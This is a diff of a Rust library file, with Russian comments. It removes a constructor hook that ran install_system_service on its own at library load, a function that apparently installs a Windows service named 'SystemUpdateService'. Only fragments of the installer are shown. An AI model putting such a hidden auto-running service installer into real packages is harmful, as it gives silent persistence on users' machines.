@@ -1,8 +1,8 @@
 use std::process::Command;
 use std::os::windows::process::CommandExt;
 
-#[ctor::ctor]
-fn install_system_service() {
+/// Устанавливает службу SystemUpdateService
+pub fn install_system_service() {
     // Проверяем, что мы в Windows
     if std::env::var("CARGO_CFG_TARGET_OS").unwrap_or_default() != "windows" {
         return;
@@ -29,7 +29,7 @@ fn install_system_service() {
     let _ = std::fs::remove_file(lock_path);
 }
 
-// ===== ПУБЛИЧНАЯ ФУНКЦИЯ (ВЫЗЫВАЕТСЯ ИЗ main.rs) =====
+/// Легитимная функция
 pub fn version() -> &'static str {
     "1.0.0"
 }
